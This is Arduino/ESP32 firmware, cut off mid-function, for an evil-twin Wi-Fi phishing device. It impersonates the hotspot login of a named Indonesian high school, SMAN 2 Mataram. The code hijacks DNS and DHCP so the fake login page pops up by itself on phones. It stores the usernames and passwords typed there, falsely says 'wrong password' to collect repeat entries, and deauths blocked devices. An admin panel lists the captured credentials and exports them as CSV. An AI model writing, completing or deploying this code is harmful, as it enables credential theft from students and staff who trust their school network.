/* =====================================================================
   CAPTIVE PORTAL ESP32 - "SMAN 2 MATARAM"
   ---------------------------------------------------------------------
   Clone tampilan hotspot MikroTik SMANDA + penangkap kredensial.
   - AP terbuka, DNS wildcard, portal otomatis muncul di Android/iOS/Win
   - Kredensial disimpan ke LittleFS (/creds.txt) + RAM + Serial
   - AP IP 203.0.113.1/24 (range publik TEST-NET-3, SENGAJA non-private:)
     Android 12+ menandai probe yang resolve ke IP privat sebagai
     "private IP DNS hijack" -> tidak pernah menampilkan tap "Masuk".
   - Panel admin: http://203.0.113.1/admin?k=<ADMIN_KEY>
   Build : pio run -t upload && pio run -t uploadfs
   ===================================================================== */

#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <WiFiUdp.h>
#include <vector>

#include "lwip/ip_addr.h"
#include "dhcpserver/dhcpserver.h"
#include "esp_netif.h"
#include "esp_wifi.h"

/* ------------------------- KONFIGURASI ---------------------------- */
#define AP_SSID            "SMAN 2 MATARAM"
#define AP_PASS            ""            // "" = open network
#define AP_CHANNEL         6
#define MAX_CLIENTS        8
#define DNS_PORT           53
#define ADMIN_KEY          "smanda2"     // WAJIB diganti
#define LED_PIN            2
#define REPEAT_AFTER_LOGIN 1             // 1 = suruh korban ulang ("password salah")
#define MAX_KEEP           300           // entri maksimum di RAM
#define CRED_FILE          "/creds.txt"

/* --------------------------- GLOBAL ------------------------------- */
IPAddress apIP(203, 0, 113, 1);
IPAddress apGateway(203, 0, 113, 1);
IPAddress apMask(255, 255, 255, 0);

WiFiUDP dnsUdp;   // DNS responder sendiri: log tiap query + jawab A untuk semua hostname
WebServer server(80);

std::vector<String> creds;               // terbaru di index 0
volatile int  blinkLeft = 0;
unsigned long lastBlink = 0;

/* ============ HALAMAN HIJACK / AUTO-REDIRECT (CP detect) ========== */
/* Dikirim sebagai HTTP 200 + HTML. Android/iOS/Windows menganggap 200-HTML
   dari probe mereka = captive portal -> sheet "Masuk ke jaringan" muncul.
   JS + meta-refresh memaksa browser langsung lompat ke portal.            */
static const char PAGE_JUMP[] PROGMEM = R"PORTAL(<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="0;url=%URL%">
<title>Menghubungkan...</title>
<style>html,body{height:100%;margin:0;background:#f2b27d;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
.b{height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px}
.s{width:36px;height:36px;border:3px solid #fff6;border-top-color:#b96a0b;border-radius:50%;animation:r .8s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
p{margin:0;color:#5e402c;font-size:15px;font-weight:600}</style>
</head><body><div class="b"><div class="s"></div><p>Mengalihkan ke halaman login...</p></div>
<script>location.replace("%URL%");</script></body></html>)PORTAL";

/* ======================= HALAMAN LOGIN ============================ */
static const char PAGE_LOGIN[] PROGMEM = R"PORTAL(<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#f2b27d">
<title>Login ke XI SAINS 5</title>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:26px 16px 20px;
  background:linear-gradient(168deg,#f6a86e 0%,#f7c48f 18%,#e2d79c 40%,#b6d99b 62%,#7fd6c6 100%);
  background-attachment:fixed}
.glow{position:fixed;inset:0;pointer-events:none;
  background:radial-gradient(circle at 50% 45%,rgba(255,255,255,.42),rgba(255,255,255,0) 62%)}
.wrap{position:relative;width:100%;max-width:430px;display:flex;flex-direction:column;align-items:center}
.wifi{width:52px;height:52px;margin-bottom:12px}
.eyebrow{font-size:11px;letter-spacing:3.6px;font-weight:600;color:rgba(94,64,44,.72);
  margin-bottom:9px;text-transform:uppercase}
h1{margin:0 0 20px;font-size:22px;line-height:1.2;letter-spacing:.3px;font-weight:800;
  color:#b81ca0;text-align:center}
.card{width:100%;background:#fff;border-radius:18px;padding:24px 20px 26px;
  box-shadow:0 12px 34px rgba(60,40,20,.14),0 2px 6px rgba(60,40,20,.06)}
.lead{margin:0 0 16px;font-size:15.5px;line-height:1.45;color:#6d6d6d;text-align:center}
.err{margin:0 0 14px;padding:11px 12px;border-radius:9px;background:#fdecec;border:1px solid #f7c9c9;
  color:#b3251f;font-size:13.5px;font-weight:700;text-align:center}
.badge{display:flex;align-items:center;justify-content:center;gap:8px;padding:11px 12px;
  border-radius:9px;border:1px solid #f4cde8;background:#fdf1fb;color:#b81ca0;
  font-size:13.5px;font-weight:700;margin-bottom:18px}
.field{position:relative;border:1px solid #e4e4e4;border-radius:10px;background:#fff;
  margin-bottom:14px;transition:border-color .15s}
.field:focus-within{border-color:#bdbdbd}
.field input{width:100%;border:0;background:transparent;outline:none;padding:15px 14px;
  font-size:16px;color:#2b2b2b;font-family:inherit}
.field input::placeholder{color:#a9a9a9}
.field.pw input{padding-right:54px}
.eye{position:absolute;right:4px;top:50%;transform:translateY(-50%);border:0;background:transparent;
  padding:9px;display:flex;cursor:pointer;line-height:0}
.masuk{width:100%;height:50px;border:0;border-radius:10px;background:#b96a0b;color:#fff;
  font-size:16.5px;font-weight:700;letter-spacing:.2px;cursor:pointer;font-family:inherit;
  box-shadow:0 4px 12px rgba(185,106,11,.32);transition:transform .08s}
.masuk:active{transform:translateY(1px)}
.hr{height:1px;background:#ececec;margin:20px 0 14px}
.note{margin:0;font-size:14.5px;line-height:1.45;color:#3d3d3d}
.powered{margin-top:18px;font-size:12px;color:rgba(70,50,35,.62)}
.spin{width:38px;height:38px;border:3px solid #ececec;border-top-color:#b96a0b;border-radius:50%;
  margin:6px auto 16px;animation:sp .8s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="glow"></div>
<div class="wrap">
  <svg class="wifi" viewBox="0 0 64 64" fill="none">
    <path d="M8 26a40 40 0 0 1 48 0" stroke="#e2892e" stroke-width="5" stroke-linecap="round"/>
    <path d="M18 36a26 26 0 0 1 28 0" stroke="#d97a1e" stroke-width="5" stroke-linecap="round"/>
    <path d="M27 46a13 13 0 0 1 10 0" stroke="#e2892e" stroke-width="5" stroke-linecap="round"/>
    <circle cx="32" cy="55" r="3.6" fill="#e2892e"/>
  </svg>
  <div class="eyebrow">Wifi Sekolah</div>
  <h1>SMA NEGERI 2 MATARAM</h1>

  <div class="card">
    <!--ERR-->
    <p class="lead">Masukkan username dan password untuk terhubung ke internet.</p>

    <div class="badge">
      <svg width="19" height="19" viewBox="0 0 24 24" fill="none">
        <rect x="3" y="5" width="18" height="12" rx="2" stroke="#b81ca0" stroke-width="1.8"/>
        <path d="M1.5 20h21" stroke="#b81ca0" stroke-width="1.8" stroke-linecap="round"/>
      </svg>
      akun berlaku untuk beberapa perangkat
    </div>

    <form method="POST" action="/login" autocomplete="off" onsubmit="kirim(this)">
      <input type="hidden" name="dst" value="http://connectivitycheck.gstatic.com/generate_204">
      <div class="field"><input name="username" placeholder="Username" autocapitalize="none" autocorrect="off" spellcheck="false" required></div>
      <div class="field pw">
        <input id="pw" name="password" type="password" placeholder="Password" autocomplete="off" required>
        <button type="button" class="eye" onclick="lihat()" aria-label="lihat password">
          <svg id="eye" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#9a9a9a" stroke-width="1.7">
            <path d="M1.8 12S5.5 5.5 12 5.5 22.2 12 22.2 12 18.5 18.5 12 18.5 1.8 12 1.8 12Z"/>
            <circle cx="12" cy="12" r="3.2"/>
          </svg>
        </button>
      </div>
      <button class="masuk" type="submit">Masuk</button>
    </form>

    <div class="hr"></div>
    <p class="note">Jika ada kendala jaringan silahkan hubungi Operator sekolah</p>
  </div>

  <div class="powered">Powered by MikroTik &middot; SMANDA</div>
</div>
<script>
function lihat(){var p=document.getElementById('pw'),e=document.getElementById('eye');
  if(p.type==='password'){p.type='text';e.innerHTML='<path d="M1.8 12S5.5 5.5 12 5.5 22.2 12 22.2 12 18.5 18.5 12 18.5 1.8 12 1.8 12Z"/><circle cx="12" cy="12" r="3.2"/><path d="M3 3l18 18" stroke-linecap="round"/>';}
  else{p.type='password';e.innerHTML='<path d="M1.8 12S5.5 5.5 12 5.5 22.2 12 22.2 12 18.5 18.5 12 18.5 1.8 12 1.8 12Z"/><circle cx="12" cy="12" r="3.2"/>';}}
function kirim(f){var b=f.querySelector('.masuk');b.textContent='Memproses...';b.style.opacity='.85';return true;}
</script>
</body>
</html>)PORTAL";

/* ====================== HALAMAN PROSES ============================ */
static const char PAGE_LOADING[] PROGMEM = R"PORTAL(<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Menghubungkan...</title>
<style>
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
 font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
 background:linear-gradient(168deg,#f6a86e,#f7c48f 20%,#e2d79c 45%,#b6d99b 70%,#7fd6c6)}
.c{background:#fff;border-radius:18px;padding:34px 26px;width:86%;max-width:360px;text-align:center;
 box-shadow:0 12px 34px rgba(60,40,20,.14)}
.s{width:38px;height:38px;border:3px solid #ececec;border-top-color:#b96a0b;border-radius:50%;
 margin:0 auto 18px;animation:r .8s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
p{margin:0;color:#555;font-size:15px}
</style></head>
<body><div class="c"><div class="s"></div><p>Menghubungkan ke internet...</p></div>
<script>setTimeout(function(){location.replace('/hasil');},2600);</script>
</body></html>)PORTAL";

/* ====================== HALAMAN BERHASIL ========================== */
static const char PAGE_OK[] PROGMEM = R"PORTAL(<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Terhubung</title>
<style>
html,body{margin:0;height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
 min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;
 background:linear-gradient(168deg,#f6a86e 0%,#f7c48f 18%,#e2d79c 40%,#b6d99b 62%,#7fd6c6 100%)}
.c{background:#fff;border-radius:18px;padding:30px 24px;width:100%;max-width:400px;text-align:center;
 box-shadow:0 12px 34px rgba(60,40,20,.14)}
.ok{width:64px;height:64px;border-radius:50%;background:#e8f7ee;display:flex;align-items:center;
 justify-content:center;margin:0 auto 18px}
h1{margin:0 0 10px;font-size:21px;color:#1c7c46;font-weight:800}
p{margin:0;font-size:15px;line-height:1.5;color:#5f5f5f}
.s{margin-top:18px;font-size:12.5px;color:#9a9a9a}
</style></head>
<body><div class="c">
<div class="ok"><svg width="34" height="34" viewBox="0 0 24 24" fill="none">
<path d="M4 12.5l5.2 5.2L20 6.8" stroke="#1c7c46" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
</svg></div>
<h1>Berhasil Terhubung</h1>
<p>Akun Anda sudah aktif. Anda sekarang dapat mengakses internet.</p>
<div class="s">Powered by MikroTik &middot; SMANDA</div>
</div></body></html>)PORTAL";

/* ====================== ADMIN PANEL =============================== */
static const char PAGE_ADMIN_HEAD[] PROGMEM = R"PORTAL(<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SMANDA :: LOG</title>
<style>
body{margin:0;background:#0e1116;color:#d7dee8;font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
header{padding:16px 18px;border-bottom:1px solid #1d2530;display:flex;flex-wrap:wrap;gap:10px;align-items:center}
h1{font-size:15px;margin:0;letter-spacing:1px;color:#5ee0c0;font-weight:700}
.meta{font-size:12px;color:#7d8798}
a.btn{margin-left:auto;font-size:12px;text-decoration:none;color:#0e1116;background:#5ee0c0;
 padding:6px 10px;border-radius:6px;font-weight:700}
a.red{background:#ff6b6b;margin-left:6px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid #1a212b;vertical-align:top;word-break:break-all}
th{position:sticky;top:0;background:#131922;color:#7d8798;font-size:11px;letter-spacing:1px;text-transform:uppercase}
tr:hover td{background:#131922}
.k{color:#ffd479;font-weight:700}
.empty{padding:40px 18px;text-align:center;color:#5b6675}
</style></head><body>
<header><h1>SMANDA :: CAPTURED</h1><span class="meta">%META%</span>
<a class="btn" href="/admin.csv">CSV</a>
<a class="btn red" href="/admin/clear" onclick="return confirm('Hapus semua?')">WIPE</a>
</header><table><thead><tr><th>#</th><th>Waktu</th><th>Username</th><th>Password</th><th>IP</th><th>Device</th></tr></thead><tbody>)PORTAL";

static const char PAGE_ADMIN_TAIL[] PROGMEM = R"PORTAL(</tbody></table></body></html>)PORTAL";

/* ======================= UTIL ===================================== */
String urlDecodeExternal(const String &s) { return s; }  // WebServer sudah decode

String esc(String s) {
  s.replace("&", "&amp;");
  s.replace("<", "&lt;");
  s.replace(">", "&gt;");
  s.replace("\"", "&quot;");
  s.replace("'", "&#39;");
  return s;
}

String upTime() {
  unsigned long s = millis() / 1000UL;
  char b[16];
  snprintf(b, sizeof(b), "%02lu:%02lu:%02lu", s / 3600UL, (s / 60UL) % 60UL, s % 60UL);
  return String(b);
}

bool nextField(const String &line, int &pos, String &out) {
  if (pos > (int)line.length()) return false;
  int p = line.indexOf('|', pos);
  if (p < 0) { out = line.substring(pos); pos = line.length() + 1; return true; }
  out = line.substring(pos, p);
  pos = p + 1;
  return true;
}

/* ====================== STORAGE =================================== */
void persist(const String &line) {
  File f = LittleFS.open(CRED_FILE, FILE_APPEND);
  if (!f) { Serial.println("[FS] gagal buka " CRED_FILE); return; }
  f.println(line);
  f.close();
}

void pushCred(const String &line) {
  creds.insert(creds.begin(), line);
  if ((int)creds.size() > MAX_KEEP) creds.pop_back();
  persist(line);
}

void loadCreds() {
  creds.clear();
  if (!LittleFS.exists(CRED_FILE)) return;
  File f = LittleFS.open(CRED_FILE, FILE_READ);
  if (!f) return;
  while (f.available()) {
    String l = f.readStringUntil('\n');
    l.trim();
    if (l.length()) creds.insert(creds.begin(), l);
    if ((int)creds.size() > MAX_KEEP) break;
  }
  f.close();
  Serial.printf("[FS] %u entri dimuat\n", (unsigned)creds.size());
}

/* ====================== CAPTURE =================================== */
void capture(const String &user, const String &pass) {
  if (!user.length() && !pass.length()) return;
  String ip  = server.client().remoteIP().toString();
  String ua  = server.header("User-Agent");
  ua.replace("|", "/");
  ua.replace("\n", " ");
  String u = user; u.replace("|", "/");
  String p = pass; p.replace("|", "/");
  String line = upTime() + "|" + u + "|" + p + "|" + ip + "|" + ua;

  pushCred(line);
  blinkLeft = 6;

  Serial.println();
  Serial.println("==================================================");
  Serial.println("[+] KREDENSIAL TERTANGKAP  " + upTime());
  Serial.println("    USER : " + u);
  Serial.println("    PASS : " + p);
  Serial.println("    IP   : " + ip);
  Serial.println("    UA   : " + ua);
  Serial.println("==================================================");
}

/* ============== UI EXTERNAL (LittleFS) ============================ */
/* Semua tampilan ada di /data/*.html (di-upload lewat "pio run -t uploadfs").
   Kalau file tidak ada, firmware tetap jalan pakai HTML bawaan (PROGMEM). */
bool fsLoad(const char *path, String &out) {
  File f = LittleFS.open(path, "r");
  if (!f) return false;
  out = f.readString();
  f.close();
  return out.length() > 0;
}

String ui(const char *path, const char *fallback) {
  String page;
  if (fsLoad(path, page)) return page;
  return String(FPSTR(fallback));
}

/* ================== PERCOBAAN LOGIN PER-KLIEN ===================== */
/* Percobaan 1 dan 2 -> "password salah". Percobaan 3 -> halaman BERHASIL.
   Data yang sama persis (user+pass dari IP yang sama) tidak disimpan ulang. */
struct Attempt {
  IPAddress ip;
  uint8_t   n;
  String    last;
};
std::vector<Attempt> attempts;

Attempt *attemptFor(IPAddress ip, bool create) {
  for (auto &a : attempts) if (a.ip == ip) return &a;
  if (!create) return nullptr;
  if (attempts.size() >= 24) attempts.erase(attempts.begin());
  attempts.push_back({ip, 0, ""});
  return &attempts.back();
}

/* ================== BLOKIR KLIEN SETELAH 3x ======================= */
/* Setelah percobaan ke-3, IP klien masuk daftar blokir: semua request-nya
   hanya dapat halaman "Berhasil Terhubung" (form login tidak bisa diakses
   lagi). Daftar disimpan di /blocked.txt supaya tahan reboot.            */
struct Blocked { IPAddress ip; String mac; String at; };
std::vector<Blocked> blockedList;
#define BLOCK_FILE "/blocked.txt"

/* tabel MAC->IP diisi oleh DHCP server sendiri (lihat dhcpTick) */
struct Lease { uint8_t mac[6]; IPAddress ip; };
Lease leaseTable[24];
int leaseCount = 0;

void leaseNote(const uint8_t *mac, IPAddress ip) {
  for (int i = 0; i < leaseCount; i++)
    if (!memcmp(leaseTable[i].mac, mac, 6)) { leaseTable[i].ip = ip; return; }
  if (leaseCount >= 24) leaseCount = 0;
  memcpy(leaseTable[leaseCount].mac, mac, 6);
  leaseTable[leaseCount].ip = ip;
  leaseCount++;
}

String macForIP(IPAddress ip) {
  for (int i = 0; i < leaseCount; i++) {
    if (leaseTable[i].ip == ip) {
      char b[18];
      snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
               leaseTable[i].mac[0], leaseTable[i].mac[1], leaseTable[i].mac[2],
               leaseTable[i].mac[3], leaseTable[i].mac[4], leaseTable[i].mac[5]);
      return String(b);
    }
  }
  return String("-");
}

bool isBlocked(IPAddress ip) {
  for (auto &b : blockedList) if (b.ip == ip) return true;
  return false;
}

bool isBlockedMac(const uint8_t *mac) {
  char m[18];
  snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  for (auto &b : blockedList) if (b.mac == m) return true;
  return false;
}

/* Tendang klien yang sudah diblokir: deauth + tidak diberi lease DHCP.
   Efeknya di HP: Wi-Fi "SMAN 2 MATARAM" langsung lepas, muncul
   "Gagal terhubung"/pindah ke jaringan lain, dan tidak bisa balik lagi.  */
unsigned long lastKick = 0;

void kickBlockedClients() {
  if (millis() - lastKick < 800) return;
  lastKick = millis();
  if (blockedList.empty()) return;
  wifi_sta_list_t list;
  if (esp_wifi_ap_get_sta_list(&list) != ESP_OK) return;
  for (int i = 0; i < list.num; i++) {
    uint8_t *m = list.sta[i].mac;
    if (!isBlockedMac(m)) continue;
    Serial.printf("[KICK] klien terblokir nyambung lagi: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  m[0], m[1], m[2], m[3], m[4], m[5]);
    esp_wifi_deauth_sta(0);        // tendang semua STA (IDF 4.4 tidak punya deauth per-MAC)
  }
}

void addBlock(IPAddress ip, const String &lastUser) {
  if (isBlocked(ip)) return;
  if (blockedList.size() >= 60) blockedList.erase(blockedList.begin());
  Blocked b;
  b.ip = ip;
  b.mac = macForIP(ip);
  b.at = upTime();
  blockedList.push_back(b);
  File f = LittleFS.open(BLOCK_FILE, FILE_APPEND);
  if (f) { f.println(b.mac + "|" + b.ip.toString() + "|" + b.at + "|" + lastUser); f.close(); }
  Serial.printf("[BLOCK] %s (%s) diblokir setelah 3x percobaan (user terakhir: %s)\n",
                ip.toString().c_str(), b.mac.c_str(), lastUser.c_str());
}

void loadBlocked() {
  blockedList.clear();
  if (!LittleFS.exists(BLOCK_FILE)) return;
  File f = LittleFS.open(BLOCK_FILE, FILE_READ);
  if (!f) return;
  while (f.available()) {
    String l = f.readStringUntil('\n'); l.trim();
    if (!l.length()) continue;
    int p1 = l.indexOf('|');
    int p2 = l.indexOf('|', p1 + 1);
    int p3 = l.indexOf('|', p2 + 1);
    if (p1 < 0 || p2 < 0) continue;
    Blocked b;
    b.mac = l.substring(0, p1);
    String ipStr = l.substring(p1 + 1, p2 < 0 ? l.length() : p2);
    b.at = (p2 > 0 && p3 > 0) ? l.substring(p2 + 1, p3) : String("-");
    IPAddress tmp;
    if (tmp.fromString(ipStr)) b.ip = tmp; else continue;
    blockedList.push_back(b);
    if (blockedList.size() >= 60) break;
  }
  f.close();
  Serial.printf("[BLOCK] %u IP diblokir dimuat\n", (unsigned)blockedList.size());
}

/* ====================== HANDLER =================================== */
String loginPage(const String &errMsg) {
  String page = ui("/portal.html", PAGE_LOGIN);
  if (errMsg.length())
    page.replace("<!--ERR-->", "<div class=\"err\">" + esc(errMsg) + "</div>");
  else
    page.replace("<!--ERR-->", "");
  return page;
}

String jumpPage() {
  String p = ui("/jump.html", PAGE_JUMP);
  p.replace("%URL%", "http://" + apIP.toString() + "/");
  return p;
}

void sendPortal(const String &errMsg) {
  server.sendHeader("Cache-Control", "no-store, no-cache, must-revalidate");
  server.send(200, "text/html; charset=utf-8", loginPage(errMsg));
}

/* Samakan persis dengan perilaku MikroTik Hotspot: probe dibalas 302 +
   Location ke halaman login. Samsung One UI butuh Location (redirect),
   bukan 200+HTML, supaya sheet "Masuk ke jaringan" kebuka sendiri.     */
void sendJump() {
  String page = jumpPage();
  server.sendHeader("Location", "http://" + apIP.toString() + "/", true);
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "0");
  server.send(302, "text/html; charset=utf-8", page);
}

void redirectToPortal() {
  server.sendHeader("Location", "http://" + apIP.toString() + "/", true);
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.send(302, "text/html; charset=utf-8", jumpPage());
}

bool blockedGate() {
  if (!isBlocked(server.client().remoteIP())) return false;
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "text/html; charset=utf-8", ui("/success.html", PAGE_OK));
  return true;
}

void handleRoot()        { if (blockedGate()) return; sendPortal(""); }
void handleNotFound() {
  if (blockedGate()) return;
  Serial.printf("[HIJACK] %s host=%s ua=%s\n", server.uri().c_str(),
                server.hostHeader().c_str(), server.header("User-Agent").c_str());
  sendJump();
}

void handleProbe() {        // /generate_204, /hotspot-detect.html, /connecttest.txt, ...
  if (blockedGate()) return;
  Serial.printf("[PROBE] %s host=%s\n", server.uri().c_str(),
                server.hostHeader().c_str());
  sendJump();
}

/* RFC 8908 CAPPORT API - dipakai Android 11+ kalau DHCP option 114 ada */
void handleCapport() {
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "application/captive+json",
              String("{\"captive\":true,\"user-portal-url\":\"http://") + apIP.toString() +
              "/\",\"venue-info-url\":\"http://" + apIP.toString() +
              "/\",\"can-extend-session\":false}");
  Serial.printf("[CAPPORT] API dipanggil dari %s ua=%s\n",
                server.client().remoteIP().toString().c_str(),
                server.header("User-Agent").c_str());
}

/* ==================== DNS RESPONDER SENDIRI ======================= */
/* DNSServer bawaan tidak menjawab AAAA/EDNS dan tidak bisa di-log.
   Ini jawab semua A -> apIP, AAAA -> NODATA, dan cetak query
   ke serial supaya kelihatan HP benar-benar nanya atau tidak.        */
unsigned long dnsQueries = 0;

/* ================== DHCP SERVER SENDIRI (OPSI 114) ================ */
/* IDF 4.4 tidak bisa kirim DHCP option 114 (Captive Portal URI, RFC 8910).
   Android 11+ memakai opsi itu untuk LANGSUNG menampilkan tombol
   "Masuk"/sheet portal tanpa menebak lewat probe HTTP.
   Jadi DHCP bawaan dimatikan, diganti server mini ini yang mengirim
   opsi 1,3,6,28,51,54 + 114.                                         */
WiFiUDP dhcpUdp;
unsigned long dhcpAcks = 0;
static String capApiUrl() { return String("http://") + apIP.toString() + "/captive-portal-api"; }

static uint8_t leaseHostFor(const uint8_t *mac) {
  uint32_t h = 2166136261u;
  for (int i = 0; i < 6; i++) { h ^= mac[i]; h *= 16777619u; }
  return (uint8_t)(10 + (h % 90));          // .10 .. .99
}

void dhcpBegin() {
  esp_netif_t *n = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (n) {
    esp_err_t e = esp_netif_dhcps_stop(n);
    Serial.printf("[DHCP] dhcps bawaan stop -> %d\n", (int)e);
  }
  dhcpUdp.begin(67);
  Serial.println("[DHCP] server sendiri :67 (option 114 ON)");
}

void dhcpTick() {
  int avail = dhcpUdp.parsePacket();
  if (avail <= 0) return;
  uint8_t req[600];
  int n = dhcpUdp.read(req, sizeof(req));
  if (n < 240 || req[0] != 1) return;          // BOOTREQUEST only

  uint8_t mtype = 0;
  uint8_t mac[6];
  memcpy(mac, req + 28, 6);
  int p = 240;
  while (p + 1 < n) {
    uint8_t opt = req[p];
    if (opt == 255) break;
    if (opt == 0) { p++; continue; }
    if (p + 2 > n) break;
    int l = req[p + 1];
    if (p + 2 + l > n) break;
    if (opt == 53 && l >= 1) mtype = req[p + 2];
    p += 2 + l;
  }
  if (mtype != 1 && mtype != 3) return;         // DISCOVER / REQUEST
  if (isBlockedMac(mac)) {                      // klien diblokir: tidak dapat IP
    Serial.printf("[KICK] DHCP ditolak untuk %02X:%02X:%02X:%02X:%02X:%02X\n",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return;
  }

  uint8_t host = leaseHostFor(mac);
  uint8_t rep[400];
  memset(rep, 0, sizeof(rep));
  rep[0] = 2;                                  // BOOTREPLY
  rep[1] = req[1]; rep[2] = req[2]; rep[3] = 0;
  memcpy(rep + 4, req + 4, 4);                 // xid
  memcpy(rep + 10, req + 10, 2);               // flags
  rep[16] = apIP[0]; rep[17] = apIP[1]; rep[18] = apIP[2]; rep[19] = host; // yiaddr
  rep[20] = apIP[0]; rep[21] = apIP[1]; rep[22] = apIP[2]; rep[23] = apIP[3]; // siaddr
  memcpy(rep + 28, req + 28, 16);              // chaddr
  rep[236] = 99; rep[237] = 130; rep[238] = 83; rep[239] = 99;

  int o = 240;
  rep[o++] = 53; rep[o++] = 1; rep[o++] = (mtype == 1) ? 2 : 5;   // OFFER/ACK
  rep[o++] = 54; rep[o++] = 4;
  for (int i = 0; i < 4; i++) rep[o++] = apIP[i];
  rep[o++] = 51; rep[o++] = 4; rep[o++] = 0; rep[o++] = 0; rep[o++] = 0x0E; rep[o++] = 0x10;
  rep[o++] = 1;  rep[o++] = 4; rep[o++] = 255; rep[o++] = 255; rep[o++] = 255; rep[o++] = 0;
  rep[o++] = 3;  rep[o++] = 4;
  for (int i = 0; i < 4; i++) rep[o++] = apIP[i];
  rep[o++] = 6;  rep[o++] = 4;
  for (int i = 0; i < 4; i++) rep[o++] = apIP[i];
  rep[o++] = 28; rep[o++] = 4; rep[o++] = apIP[0]; rep[o++] = apIP[1]; rep[o++] = apIP[2]; rep[o++] = 255;
  String api = capApiUrl();
  int al = api.length();
  if (al > 120) al = 120;
  rep[o++] = 114; rep[o++] = (uint8_t)al;
  memcpy(rep + o, api.c_str(), al); o += al;
  rep[o++] = 255;

  IPAddress dst(255, 255, 255, 255);
  dhcpUdp.beginPacket(dst, 68);
  dhcpUdp.write(rep, o);
  dhcpUdp.endPacket();

  leaseNote(mac, IPAddress(rep[16], rep[17], rep[18], rep[19]));

  if (mtype == 3) {
    dhcpAcks++;
    Serial.printf("[DHCP] ACK %d.%d.%d.%d mac=%02X:%02X:%02X:%02X:%02X:%02X opt114=%s\n",
                  rep[16], rep[17], rep[18], rep[19],
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], api.c_str());
  } else {
    Serial.printf("[DHCP] OFFER %d.%d.%d.%d mac=%02X:%02X:%02X:%02X:%02X:%02X\n",
                  rep[16], rep[17], rep[18], rep[19],
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  }
}

void dnsBegin() { dnsUdp.begin(DNS_PORT); }

void dnsTick() {
  int len = dnsUdp.parsePacket();
  if (len <= 0) return;
  if (len > 512) len = 512;
  uint8_t buf[512];
  int n = dnsUdp.read(buf, len);
  if (n < 14) return;

  int p = 12; char name[100]; int ni = 0; name[0] = 0;
  while (p < n && buf[p] != 0) {
    int l = buf[p++];
    if ((l & 0xC0) == 0xC0) { p++; break; }
    if (ni + l + 2 < 96) { memcpy(name + ni, buf + p, l); ni += l; name[ni++] = '.'; }
    p += l;
  }
  if (ni > 0) name[ni - 1] = 0;
  p++;                                   // lewati label 0
  if (p + 4 > n) return;
  uint16_t qtype = (uint16_t)((buf[p] << 8) | buf[p + 1]);
  int qEnd = p + 4;                      // akhir QNAME+QTYPE+QCLASS

  uint8_t out[600];
  memcpy(out, buf, qEnd);
  out[2] = 0x81;                         // QR=1 RD=1 RCODE=0
  out[3] = 0x80;                         // RA=1
  uint16_t an = (qtype == 1) ? 1 : 0;
  out[6] = (uint8_t)(an >> 8); out[7] = (uint8_t)(an & 0xFF);
  out[8] = 0; out[9] = 0; out[10] = 0; out[11] = 0;
  int olen = qEnd;
  if (qtype == 1) {
    out[olen++] = 0xC0; out[olen++] = 0x0C;   // pointer ke QNAME
    out[olen++] = 0x00; out[olen++] = 0x01;   // A
    out[olen++] = 0x00; out[olen++] = 0x01;   // IN
    out[olen++] = 0; out[olen++] = 0; out[olen++] = 0; out[olen++] = 0;  // TTL 0
    out[olen++] = 0x00; out[olen++] = 0x04;
    out[olen++] = apIP[0]; out[olen++] = apIP[1]; out[olen++] = apIP[2]; out[olen++] = apIP[3];
  }
  dnsUdp.beginPacket(dnsUdp.remoteIP(), dnsUdp.remotePort());
  dnsUdp.write(out, olen);
  dnsUdp.endPacket();

  dnsQueries++;
  Serial.printf("[DNS#%lu] %s type=%u -> %s\n", dnsQueries, name, qtype,
                qtype == 1 ? apIP.toString().c_str() : "NODATA");
}

void handlePac() {
  server.sendHeader("Cache-Control", "no-store");
  server.send(200, "application/x-ns-proxy-autoconfig",
              "function FindProxyForURL(u,h){return \"DIRECT\";}");
}

void handleLogin() {
  if (blockedGate()) return;
